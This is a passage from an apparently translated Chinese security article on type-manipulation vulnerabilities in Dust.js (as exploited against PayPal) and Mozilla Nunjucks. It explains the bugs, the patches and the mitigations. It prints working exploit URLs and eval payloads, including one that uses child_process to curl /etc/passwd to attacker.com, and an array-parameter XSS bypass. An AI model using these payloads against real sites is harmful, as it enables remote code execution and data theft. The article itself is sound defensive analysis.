你可能会注意到，qs通过查询字符串中对象的创建方式来判断对象类型。如果同一个对象名多次出现，它就会被当成数组对象。类似地，如果一个变量显示声明为数组型变量，那么在解析该变量时Dust.js将按照数组类型进行处理。
这里距离触发Dust.js漏洞已经很近了。PayPal使用了上文分析的存在漏洞的模板，攻击者需要做的仅仅是提供device参数两次，或者以“device[]=value”形式提供参数，这样变量就会按数组方式进行参数传递，最终绕过净化函数的处理逻辑。
**（三）Dust.js漏洞后续利用**
这一部分与类型篡改主题有一定关系，但主要内容是分析攻击者如何具体利用此类漏洞。
首先，攻击者需要获得代码运行机会。这个目标可以通过一个攻击URL来实现，如下所示：
攻击所用的URL: https://host/page?device=x&device=y'-console.log('gotcha')+'
调用eval执行: eval("'xy'-console.log('gotcha')+'' == 'desktop'");
控制台日志消息对攻击者来说用处不大，因此攻击者需要使用其他更为巧妙的方法，比如将某些信息从内部往外部发送。在PayPal漏洞中，研究人员使用了如下载荷传递信息：
    http://host/page?device=x&device=y'-require('child_process').exec('curl+-F+"x=`cat+/etc/passwd`"+attacker.com')-'
等价的eval语句如下所示：
    eval("'xy'-require('child_process').exec('curl -F "x=`cat /etc/passwd`" attacker.com')-'' == 'desktop'");
以上漏洞利用方式使用的是child_process模块来执行本地curl命令，将“/etc/passwd”文件发送给攻击者。使用原生的Node命令也可以完成相同任务，但所需的载荷稍长。使用child_process模块可以将漏洞范围从远程JS代码执行延伸至远程shell命令执行，拓宽攻击者可选项。
**（四）修复措施**
大多数类型篡改漏洞（Dust.js的这个也不例外）可以通过禁用（disallowing）、规范化（normalizing）或自定义处理（custom
handling）变量类型加以修复。这三种措施可以相互结合，建立多层防御机制。
禁用变量类型意味着只有特定变量类型受模板支持。此例中，Dust.js可以选择在模板中禁用非字符串类型参数，这种处理方式将导致模板框架功能减少，因此需根据框架的具体使用方式来确定是否使用该方法。
规范化变量类型意味着各种输入类型将会转换为一种类型。本例中，Dust.js将有问题的变量传递给eval()函数时，这些变量会被隐式转化为字符串变量。与其在向eval()传递参数时对变量类型进行转化，Dust.js可以在上游函数中将传入的数组、整数或其他变量转化为字符串，然后在后续代码中（如sanitisation函数）进行处理。
自定义处理变量意味着需要对所有支持的类型编写特定的处理方式。本例中，Dust.js早就可以确定变量为数组类型，可以对数组中的每个字符串进行规范化处理，同时它也可以对多个数组的组合进行处理。自定义处理方法是三种方法中最为脆弱的，但同时也能够处理更加复杂的输入。
Dust.js选择了自定义处理方法，可以拦截toString属性为函数的所有对象。这种处理方法的确解决了这个问题，但也在代码中留下了一定的脆弱点，因为下游代码可能会选择以不同的方式将数组对象转化为用户输出。以下是[Dust.js补丁](https://github.com/linkedin/dustjs/commit/e179c8ff600e0ee73be13ee9ded904321fcbcfc0#diff-86d996c4ed91a5bbfce2bb7461033118R850)中的相关代码片段：
    dust.escapeHtml = function(s) {
    if (typeof s === "string" || (s && typeof s.toString === "function")) {
       if (typeof s !== "string") {
          s = s.toString();
       }
       if (!HCHARS.test(s)) {
          return s;
       }
     }
    };
如果你正在使用存在漏洞的Dust.js版本，同时因为各种原因无法升级，那么你可以选择在代码中对传递给Dust.js的输入类型规范化处理，或者禁用非字符串类型参数、阻止恶意数组。你可以通过Snyk的[命令行接口](https://snyk.io/docs/using-snyk)或[GitHub集成接口](https://snyk.io/add)测试所使用的Dust.js版本是否存在漏洞。
**三、Mozilla Nunjucks XSS漏洞分析**
Dust.js的漏洞不是独一无二的，我们在其他地方也可以见到类似[漏洞](https://snyk.io/vuln/npm:nunjucks:20160906)。Mozilla的Nunjuck库中的存在类似漏洞，漏洞最早于2016年9月6日由[Matt
Austin](https://github.com/matt-)发现，在[2.4.3版本](https://github.com/mozilla/nunjucks/pull/836)中得到修复，[漏洞细节](https://github.com/mozilla/nunjucks/pull/836)于2016年9月9日公布。与Dust.js类似，你可以使用[Snyk](https://snyk.io/add)来测试所使用的Nunjucks版本是否存在漏洞。
与handlebars、mustache以及其他库类似，Nunjucks允许用户在两个大括号(“) 中指定变量名称，该名称应为HTML编码格式。如下所示：
    nunjucks.renderString(
           'Hello ',
           {username: '' });
    // Outputs: Hello &lt;script&gt;alert(1)&lt;script&gt;
然而，与Dust.js类似，Nunjuck的sanitisation函数只能对字符串进行转义处理。以下是Nunjuck
sanitisation函数代码片段：
    escape: function(str) {      
      if(typeof str === 'string') {
        return r.markSafe(lib.escape(str));
      }
      return str;
    }
与前文的处理逻辑类似，如下的一个URL（由qs解析）：
    http://host/?name[]=matt
会导致代码执行，生成XSS输出，如下所示：
    nunjucks.renderString(
           'Hello ',
           {username: ['matt'] });
    // Outputs: matt
Nunjucks存在的漏洞原因与Dust.js一致，都是忽视了攻击者可以篡改变量类型。攻击者可以借此绕过sanitisation函数处理流程，注入恶意代码。
Nunjucks可以采用与Dust.js类似的防御措施，如禁用数组输入、规范化变量为字符串类型或使用自定义处理方式解析数组变量。Mozilla在[补丁](https://github.com/mozilla/nunjucks/pull/836/commits/cf037c302a380f97110b027f47d4a13a3c80b8a2)中选择使用toString方法对输入数组进行统一处理。
**四、总结**
类型篡改是一种名气较小的攻击方法，但的确可以对所有动态类型语言造成危害。在动态类型语言中，我们需要认真考虑输入类型，在每种类型上使用白名单、规范化或自定义处理方式。
本文中，我们了解了如何利用类型篡改漏洞从模板沙盒框架中逃逸，许多框架都存在该问题。不控制运行时的沙盒化技术是非常困难的，这也是[Angular完全抛弃沙盒](https://docs.angularjs.org/guide/security#sandbox-removal)的原因所在。